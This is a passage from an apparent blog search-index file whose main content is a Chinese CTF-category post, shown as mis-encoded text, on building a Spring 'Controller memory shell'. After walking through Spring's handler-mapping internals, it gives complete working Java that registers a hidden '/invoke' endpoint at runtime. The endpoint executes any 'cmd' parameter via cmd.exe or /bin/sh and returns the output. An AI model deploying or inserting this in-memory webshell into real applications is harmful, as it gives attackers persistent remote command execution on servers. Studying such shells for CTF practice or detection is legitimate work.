class="line">&#125;</span><br></pre></td></tr></table></figure></br>]]></content>
      
      
      <categories>
          
          <category> ç®€æ˜“å¼€å‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Controllerå†…å­˜é©¬</title>
      <link href="/2026/01/09/Controller%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2026/01/09/Controller%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="Controllerå†…å­˜é©¬"><a href="#Controllerå†…å­˜é©¬" class="headerlink" title="Controllerå†…å­˜é©¬"></a>Controllerå†…å­˜é©¬</h1><p>Controllerä½œä¸ºSpringWebæ¡†æ¶ä¸­æ ¸å¿ƒçš„å‚ä¸éƒ¨åˆ†ï¼Œä¹Ÿå¯ä»¥åœ¨è¿è¡Œæ—¶è¢«åŠ¨æ€æ³¨å†Œï¼Œè‹¥æ³¨å†Œè¿›å»çš„æ˜¯æ¶æ„ç±»ï¼Œåˆ™è¾¾åˆ°äº†æ³¨å…¥å†…å­˜é©¬çš„æ•ˆæœ</p><br/><h2 id="Controlleræ³¨å†Œæµç¨‹"><a href="#Controlleræ³¨å†Œæµç¨‹" class="headerlink" title="Controlleræ³¨å†Œæµç¨‹"></a>Controlleræ³¨å†Œæµç¨‹</h2><p>Springåœ¨è·å–è¯·æ±‚åˆ†é…å¤„ç†å™¨æ—¶ï¼Œè°ƒç”¨äº†<code>doDispatch()</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å†…éƒ¨åˆè°ƒç”¨äº†<code>getHandler()</code>æ–¹æ³•ï¼Œè¿”å›å€¼è¢«ä¼ é€’ç»™äº†<code>mappedHandler</code>å˜é‡ï¼Œè€Œæ­¤æ—¶å®ƒå·²ç»é€šè¿‡è¯·æ±‚è·¯å¾„å®šå‘åˆ°å…·ä½“æ–¹æ³•äº†</p><p><img src="/img/post/image-20260109141151070.png" alt="image-20260109141151070"></p><p>è¯´æ˜<code>getHandler()</code>ä¸­è‚¯å®šé€šè¿‡ä»€ä¹ˆè·å–äº†è¯·æ±‚åœ°å€ä¸æ–¹æ³•ä¹‹é—´çš„æ˜ å°„å…³ç³»ï¼Œç°åœ¨çš„ç›®æ ‡å°±æ˜¯æ‰¾åˆ°è¿™ä¸ªæ˜ å°„å…³ç³»ï¼Œæ­¥å…¥<code>getHandler()</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Nullable</span></span><br><span class="line">    <span class="keyword">protected</span> HandlerExecutionChain <span class="title function_">getHandler</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.handlerMappings != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(HandlerMapping mapping : <span class="built_in">this</span>.handlerMappings) &#123;</span><br><span class="line">                <span class="type">HandlerExecutionChain</span> <span class="variable">handler</span> <span class="operator">=</span> mapping.getHandler(request);</span><br><span class="line">                <span class="keyword">if</span> (handler != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> handler;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¯¥æ–¹æ³•ä»<code>handlerMappings</code>è¿™ä¸ªå­—æ®µä¸­éå†å‡º<code>mapping</code>ï¼Œå†å¯¹å…¶è°ƒç”¨g<code>etHandler()</code>æ–¹æ³•ï¼Œ<code>handlerMappings</code>å­—æ®µä¸­å­˜å‚¨ç€ä¸€äº›<code>HandlerMapping</code>å¯¹è±¡ï¼Œå…¶ä¸­0å·å…ƒç´ <code>RequestingMappingHandlerMapping</code>å¯¹è±¡å…·æœ‰<code>mappingRegistry</code>å­—æ®µï¼Œè¯¥å­—æ®µçš„<code>registry</code>å­—æ®µå­˜å‚¨ç€æˆ‘ä»¬æƒ³è¦çš„ä¸œè¥¿</p><p><img src="/img/post/image-20260109141825732.png" alt="image-20260109141825732"></p><p><code>RequestMappingHandlerMapping</code>å¯¹è±¡æœ¬èº«æ²¡æœ‰<code>getHandler()</code>æ–¹æ³•ï¼ŒæŸ¥æ‰¾å…¶çˆ¶ç±»<code>RequestMappingInfoHandlerMapping</code>ä¹Ÿä¸å…·æœ‰è¯¥æ–¹æ³•ï¼Œç»§ç»­æŸ¥æ‰¾å…¶çˆ¶ç±»<code>AbstractHandlerMethodMapping</code>ä¹Ÿä¸å…·æœ‰ï¼Œç»§ç»­æŸ¥æ‰¾å…¶çˆ¶ç±»<code>AbstractHandlerMapping</code>ï¼Œåœ¨è¯¥ç±»ä¸­æŸ¥æ‰¾åˆ°è¯¥æ–¹æ³•</p><p>è¯¥æ–¹æ³•å¼€å¤´å°±è°ƒç”¨äº†<code>getHandlerInternal()</code>æ–¹æ³•ï¼Œå…¶è¿”å›å€¼åˆšå¥½å°±æ˜¯ç›®æ ‡æ–¹æ³•</p><p><img src="/img/post/image-20260109142622774.png" alt="image-20260109142622774"></p><p>ç»§ç»­è·Ÿè¿›<code>getHandlerInternal()</code>ï¼Œç”±äº<code>AbstractHandlerMapping</code>çš„è¯¥æ–¹æ³•ä¸ºæŠ½è±¡æ–¹æ³•ï¼Œ<code>RequestMappingHandlerMapping</code>ä¼šè°ƒç”¨ä¸å…¶ç»§æ‰¿å…³ç³»æœ€è¿‘çš„å…·æœ‰è¯¥æ–¹æ³•çš„ç±»ï¼Œæ­¤å¤„ä¸º<code>RequestMappingInfoHandlerMapping</code>ï¼Œä½†æ˜¯è¯¥æ–¹æ³•åˆå»è°ƒç”¨äº†çˆ¶ç±»çš„<code>getHandlerInternal()</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Nullable</span></span><br><span class="line">    <span class="keyword">protected</span> HandlerMethod <span class="title function_">getHandlerInternal</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        request.removeAttribute(PRODUCIBLE_MEDIA_TYPES_ATTRIBUTE);</span><br><span class="line"></span><br><span class="line">        HandlerMethod var2;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = <span class="built_in">super</span>.getHandlerInternal(request);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            ProducesRequestCondition.clearMediaTypesAttribute(request);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var2;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>AbstractHandlerMethodMapping</code>ä¸­ï¼Œå‡ºç°äº†ç†Ÿæ‚‰çš„<code>mappingRegistry</code>ï¼Œè¯¥æ–¹æ³•å®ç°é€šè¿‡è¯·æ±‚è·¯å¾„æŸ¥æ‰¾å¯¹åº”çš„å¤„ç†æ–¹æ³•ï¼Œé€šè¿‡<code>lookupHandlerMethod</code>å–å‡ºæ–¹æ³•å¯¹è±¡</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Nullable</span></span><br><span class="line">    <span class="keyword">protected</span> HandlerMethod <span class="title function_">getHandlerInternal</span><span class="params">(HttpServletRequest request)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">lookupPath</span> <span class="operator">=</span> <span class="built_in">this</span>.initLookupPath(request);</span><br><span class="line">        <span class="built_in">this</span>.mappingRegistry.acquireReadLock();</span><br><span class="line"></span><br><span class="line">        HandlerMethod var4;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">HandlerMethod</span> <span class="variable">handlerMethod</span> <span class="operator">=</span> <span class="built_in">this</span>.lookupHandlerMethod(lookupPath, request);</span><br><span class="line">            var4 = handlerMethod != <span class="literal">null</span> ? handlerMethod.createWithResolvedBean() : <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.mappingRegistry.releaseReadLock();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> var4;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆ<code>mappingRegistry</code>åœ¨å“ªè¢«èµ‹å€¼å‘¢ï¼Ÿæˆ‘ä»¬åˆè¯¥å¦‚ä½•æ­£ç¡®åœ°ç»™m<code>appingRegistry</code>èµ‹å€¼ï¼Ÿ<code>MappingRegistry</code>ä¸‹å…·æœ‰ä¸€ä¸ª<code>register()</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•éœ€è¦ä¸‰ä¸ªå‚æ•°<code>mapping</code>ã€<code>handler</code>ã€<code>method</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">(T mapping, Object handler, Method method)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.readWriteLock.writeLock().lock();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">HandlerMethod</span> <span class="variable">handlerMethod</span> <span class="operator">=</span> AbstractHandlerMethodMapping.<span class="built_in">this</span>.createHandlerMethod(handler, method);</span><br><span class="line">                <span class="built_in">this</span>.validateMethodMapping(handlerMethod, mapping);</span><br><span class="line">                Set&lt;String&gt; directPaths = AbstractHandlerMethodMapping.<span class="built_in">this</span>.getDirectPaths(mapping);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">for</span>(String path : directPaths) &#123;</span><br><span class="line">                    <span class="built_in">this</span>.pathLookup.add(path, mapping);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">if</span> (AbstractHandlerMethodMapping.<span class="built_in">this</span>.getNamingStrategy() != <span class="literal">null</span>) &#123;</span><br><span class="line">                    name = AbstractHandlerMethodMapping.<span class="built_in">this</span>.getNamingStrategy().getName(handlerMethod, mapping);</span><br><span class="line">                    <span class="built_in">this</span>.addMappingName(name, handlerMethod);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="type">CorsConfiguration</span> <span class="variable">corsConfig</span> <span class="operator">=</span> AbstractHandlerMethodMapping.<span class="built_in">this</span>.initCorsConfiguration(handler, method, mapping);</span><br><span class="line">                <span class="keyword">if</span> (corsConfig != <span class="literal">null</span>) &#123;</span><br><span class="line">                    corsConfig.validateAllowCredentials();</span><br><span class="line">                    <span class="built_in">this</span>.corsLookup.put(handlerMethod, corsConfig);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">this</span>.registry.put(mapping, <span class="keyword">new</span> <span class="title class_">MappingRegistration</span>(mapping, handlerMethod, directPaths, name, corsConfig != <span class="literal">null</span>));</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.readWriteLock.writeLock().unlock();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>è¯¥æ–¹æ³•åˆè¢«<code>registerMapping()</code>æ–¹æ³•è°ƒç”¨ï¼Œåé¢è·å–<code>RequestingMappingHandlerMapping</code>å¯ç›´æ¥è°ƒç”¨<code>registerMapping()</code>è¿›è¡Œæ³¨å†Œ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">registerMapping</span><span class="params">(T mapping, Object handler, Method method)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.logger.isTraceEnabled()) &#123;</span><br><span class="line">            <span class="built_in">this</span>.logger.trace(<span class="string">&quot;Register \&quot;&quot;</span> + mapping + <span class="string">&quot;\&quot; to &quot;</span> + method.toGenericString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.mappingRegistry.register(mapping, handler, method);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ï¼Œéœ€è¦è·å–webç¯å¢ƒä¸­çš„<code>mappingRegistry</code>å¯¹è±¡å¹¶è°ƒç”¨<code>register()</code>æ–¹æ³•ï¼Œå‰é¢æˆ‘ä»¬çŸ¥é“ï¼Œ<code>mappingRegistry</code>åªæ˜¯<code>handlerMappings</code>åˆ—è¡¨ä¸­çš„ä¸€ä¸ªå…ƒç´ çš„å­—æ®µï¼Œè¯¥åˆ—è¡¨åœ¨åˆå§‹åŒ–æ–¹æ³•ä¸­è¢«èµ‹å€¼ï¼Œå…¶ä¸­ä¸€ä¸ªæ·»åŠ å…ƒç´ çš„ç­–ç•¥å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">HandlerMapping</span> <span class="variable">hm</span> <span class="operator">=</span> (HandlerMapping)context.getBean(<span class="string">&quot;handlerMapping&quot;</span>, HandlerMapping.class);</span><br><span class="line"><span class="built_in">this</span>.handlerMappings = Collections.singletonList(hm);</span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶ï¼Œhmå°±æ˜¯åˆ—è¡¨å…ƒç´ ç±»å‹ï¼Œå¯ä»¥ä¾æ­¤è·å–å‰é¢çš„æ¯”å¦‚<code>RequestingMappingHandlerMapping</code>ï¼Œç°åœ¨çš„é—®é¢˜æ˜¯å¦‚ä½•è·å–<code>context</code>ï¼Œ<code>context</code>çš„ç±»å‹æ˜¯æ¥å£<code>ApplicationContext</code>çš„å®ç°ç±»ï¼Œè€ŒDispatcherServletç±»å…·æœ‰ä¸€ä¸ª<code>webApplicationContext</code>å­—æ®µï¼ˆä¸¥æ ¼ä¸Šæ˜¯å®ƒçš„çˆ¶ç±»<code>FrameworkServlet</code>çš„å­—æ®µï¼‰ï¼Œè¯¥å­—æ®µä¸º<code>WebApplicationContext</code>æ¥å£ç±»å‹ï¼Œæ˜¯<code>ApplicationContext</code>çš„ç›´æ¥å­æ¥å£ã€‚æ¢è¨€ä¹‹ï¼Œ<code>webApplicationContex</code>å°±æ˜¯å½“å‰Webç¯å¢ƒä¸‹çš„ä¸Šä¸‹æ–‡ç¯å¢ƒ</p><br/><h2 id="æ„å»ºControllerå†…å­˜é©¬"><a href="#æ„å»ºControllerå†…å­˜é©¬" class="headerlink" title="æ„å»ºControllerå†…å­˜é©¬"></a>æ„å»ºControllerå†…å­˜é©¬</h2><p>æ‰§è¡Œæ¶æ„å‘½ä»¤çš„Controller</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShellController</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">invoke</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">ServletRequestAttributes</span> <span class="variable">attributes</span> <span class="operator">=</span> (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> attributes.getRequest();</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd);</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        String output;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream(), <span class="string">&quot;GBK&quot;</span>));</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                result.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            output = result.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> output;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è·å–ä»å½“å‰è¯·æ±‚<code>WebApplicationContext</code>ã€<code>RequestMappingHandlerMapping</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">WebApplicationContext webApplicationContext = (WebApplicationContext) RequestContextHolder.getRequestAttributes().getAttribute(DispatcherServlet.WEB_APPLICATION_CONTEXT_ATTRIBUTE, 0);</span><br><span class="line">RequestMappingHandlerMapping handlerMapping = webApplicationContext.getBean(RequestMappingHandlerMapping.class);</span><br></pre></td></tr></table></figure><p>åŠ¨æ€æ³¨å†ŒController</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMappingInfo</span>.BuilderConfiguration();</span><br><span class="line">config.setPatternParser(handlerMapping.getPatternParser());</span><br><span class="line"><span class="type">RequestMappingInfo</span> <span class="variable">mappingInfo</span> <span class="operator">=</span> RequestMappingInfo</span><br><span class="line">.paths(<span class="string">&quot;/invoke&quot;</span>)</span><br><span class="line">.methods(RequestMethod.GET)</span><br><span class="line">.options(config)</span><br><span class="line">.build();</span><br><span class="line"></span><br><span class="line"><span class="type">ShellController</span> <span class="variable">shellController</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShellController</span>();</span><br><span class="line">handlerMapping.registerMapping(mappingInfo, shellController, shellController.getClass().getMethod(<span class="string">&quot;invoke&quot;</span>));</span><br></pre></td></tr></table></figure><p>Controllerå†…å­˜é©¬å…¨è²Œ</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IndexController</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/index&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">showIndex</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/inject&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">inject</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchMethodException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">WebApplicationContext</span> <span class="variable">webApplicationContext</span> <span class="operator">=</span> (WebApplicationContext) RequestContextHolder.getRequestAttributes().getAttribute(DispatcherServlet.WEB_APPLICATION_CONTEXT_ATTRIBUTE, <span class="number">0</span>);</span><br><span class="line">        <span class="type">RequestMappingHandlerMapping</span> <span class="variable">handlerMapping</span> <span class="operator">=</span> webApplicationContext.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line"></span><br><span class="line">        RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMappingInfo</span>.BuilderConfiguration();</span><br><span class="line">        config.setPatternParser(handlerMapping.getPatternParser());</span><br><span class="line">        <span class="type">RequestMappingInfo</span> <span class="variable">mappingInfo</span> <span class="operator">=</span> RequestMappingInfo</span><br><span class="line">                .paths(<span class="string">&quot;/invoke&quot;</span>)</span><br><span class="line">                .methods(RequestMethod.GET)</span><br><span class="line">                .options(config)</span><br><span class="line">                .build();</span><br><span class="line"></span><br><span class="line">        <span class="type">ShellController</span> <span class="variable">shellController</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShellController</span>();</span><br><span class="line">        handlerMapping.registerMapping(mappingInfo, shellController, shellController.getClass().getMethod(<span class="string">&quot;invoke&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;injected&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RestController</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShellController</span>&#123;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">invoke</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="type">ServletRequestAttributes</span> <span class="variable">attributes</span> <span class="operator">=</span> (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> attributes.getRequest();</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="type">ProcessBuilder</span> <span class="variable">processBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd);</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            String output;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">                <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream(), <span class="string">&quot;GBK&quot;</span>));</span><br><span class="line">                String line;</span><br><span class="line">                <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    result.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                output = result.toString();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> output;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯¥å†…å­˜é©¬æ˜¯windowsçš„æµ‹è¯•ç¯å¢ƒï¼ŒLinuxç¯å¢ƒä¸‹éœ€è¦å°†ç»ˆç«¯ç›®å½•ä¿®æ”¹è‡³<code>&quot;/bin/sh&quot;</code>ï¼Œæ‰§è¡Œå‚æ•°ä¸º<code>&quot;-c&quot;</code></p><br/><h2 id="ä¸€äº›ç»å†"><a href="#ä¸€äº›ç»å†" class="headerlink" title="ä¸€äº›ç»å†"></a>ä¸€äº›ç»å†</h2><p>èµ·åˆå­¦ä¹ Controllerå†…å­˜é©¬æ˜¯æœ‰è·Ÿç€ä¸€äº›æ–‡ç« è§†é¢‘çš„ï¼Œå…¶ä¸­ä¸€äº›ä¾‹å­è°ƒç”¨<code>registerMapping()</code>æ³¨å†Œï¼Œä¸ºäº†ä¼ å…¥<code>mapping</code>ä½¿ç”¨äº†å¼ƒç”¨çš„æ„é€ å™¨ï¼Œè¿™é‡Œéšä¾¿æ”¾ä¸€ä¾‹ï¼Œå®é™…ä¸Šå¤§å¤šæ•°æ„é€ å™¨éƒ½è¢«å¼ƒç”¨äº†</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Deprecated</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RequestMappingInfo</span><span class="params">(<span class="meta">@Nullable</span> PatternsRequestCondition patterns, <span class="meta">@Nullable</span> RequestMethodsRequestCondition methods, <span class="meta">@Nullable</span> ParamsRequestCondition params, <span class="meta">@Nullable</span> HeadersRequestCondition headers, <span class="meta">@Nullable</span> ConsumesRequestCondition consumes, <span class="meta">@Nullable</span> ProducesRequestCondition produces, <span class="meta">@Nullable</span> RequestCondition&lt;?&gt; custom)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>((String)<span class="literal">null</span>, patterns, methods, params, headers, consumes, produces, custom);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>è¿™äº›æ„é€ å™¨è¦æ±‚ä¼ å…¥<code>PatternsRequestCondition</code>è·¯å¾„åŒ¹é…æ¡ä»¶å¯¹è±¡ï¼Œspringç»™è¿™ä¸ªè·¯å¾„å¯¹è±¡é…ç½®çš„è§£æå™¨æ˜¯<code>AntPathMatcher</code>ï¼Œè€Œåœ¨è¾ƒæ–°çš„ç‰ˆæœ¬ï¼ŒSpringé»˜è®¤ä½¿ç”¨<code>PathPatternParser</code>ä½œä¸ºè§£æå™¨ï¼Œä¸¤è€…åœ¨å¤„ç†è¯·æ±‚çš„é€»è¾‘ä¸Šå®Œå…¨ä¸åŒ</p><p>å¦‚æœåœ¨è¾ƒæ–°çš„SpringBootç‰ˆæœ¬ä½¿ç”¨æ—§è§£æå™¨ï¼Œä¼šè§¦å‘æ—§è§£æé“¾ä¸­<code>UrlPathHelper</code>è°ƒç”¨<code>getResolvedLookupPath()</code>å°è¯•è·å–è·¯å¾„ï¼Œä½†<code>PathPatternParser</code>è§£æè·¯çº¿ä¸éœ€è¦<code>UrlPathHelper</code>çš„å‚ä¸ï¼Œ<code>UrlPathHelper</code>è·å–ä¸åˆ°è·¯å¾„å°±ä¼šæŠ›å‡ºå¼‚å¸¸</p><p>å½“æ—¶å°±ç»å¸¸æŠ›å‡ºå¼‚å¸¸</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java.lang.IllegalArgumentException: Expected lookupPath in request attribute <span class="string">&quot;org.springframework.web.util.UrlPathHelper.PATH&quot;</span>.</span><br></pre></td></tr></table></figure><p>é—®AIæ€»æ˜¯è¯´ä»€ä¹ˆçº¿ç¨‹ä¸åŒæ­¥ã€æ‰‹åŠ¨è®¾ç½®PATHå±æ€§ä»€ä¹ˆçš„ï¼Œæ˜¯åœ¨æ˜¯ä¸æ•¢é‡‡çº³ï¼Œæœ€åä¸€æ­¥æ­¥è°ƒè¯•åœ¨<code>getMatchingMapping()</code>æ–¹æ³•ä¸­å‘ç°åˆ†åˆ«è®¿é—®<code>/inject</code>å’Œ<code>/invoke</code>æ—¶<code>RequestMappingInfo</code>é…ç½®ä¸ä¸€æ ·</p><p>è®¿é—®<code>/inject</code>è·¯å¾„ï¼Œå¯ä»¥æ­£å¸¸è®¿é—®</p><p><img src="/img/post/45188f8d737c2cba81a408b602b30cc9.png" alt="45188f8d737c2cba81a408b602b30cc9"></p><p>è®¿é—®<code>/invoke</code>è·¯å¾„ï¼ŒæŠ›å‡ºå¼‚å¸¸</p><p><img src="/img/post/7fe01fd21e59a7d06d4d57be531e3262.png" alt="7fe01fd21e59a7d06d4d57be531e3262"></p><p><code>/inject</code>é‡‡ç”¨äº†é»˜è®¤çš„<code>pathPatternCondition</code>ï¼Œè€Œ<code>/invoke</code>é‡‡ç”¨çš„æ˜¯æ—§çš„<code>patternsCondition</code>ï¼Œè¿™å°±æ˜¯é—®é¢˜æ‰€åœ¨</p><p>è§£å†³æ–¹æ³•æ˜¯ä½¿ç”¨æ–¹æ³•é“¾çš„æ–¹å¼å»æ„å»º<code>mapping</code>ï¼Œè¿™æ ·å¯ä»¥æŒ‡å®šè§£æå™¨æ¨¡å¼ï¼Œè¯¥æ–¹æ³•æ–°æ—§é€šç”¨ï¼Œå› ä¸ºæ˜¯ç›´æ¥è·å–äº†Springçš„é…ç½®ä¿¡æ¯</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">RequestMappingInfo.<span class="type">BuilderConfiguration</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RequestMappingInfo</span>.BuilderConfiguration();</span><br><span class="line">config.setPatternParser(handlerMapping.getPatternParser());</span><br><span class="line"><span class="type">RequestMappingInfo</span> <span class="variable">mappingInfo</span> <span class="operator">=</span> RequestMappingInfo</span><br><span class="line">.paths(<span class="string">&quot;/invoke&quot;</span>)</span><br><span class="line">.methods(RequestMethod.GET)</span><br><span class="line">.options(config)</span><br><span class="line">.build();</span><br></pre></td></tr></table></figure><br/>]]></content>
      
      
      <categories>
          
          <category> CTFç›¸å…³ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Servletä¸Listenerå†…å­˜é©¬</title>
      <link href="/2026/01/06/Servlet%E4%B8%8EListener%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2026/01/06/Servlet%E4%B8%8EListener%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
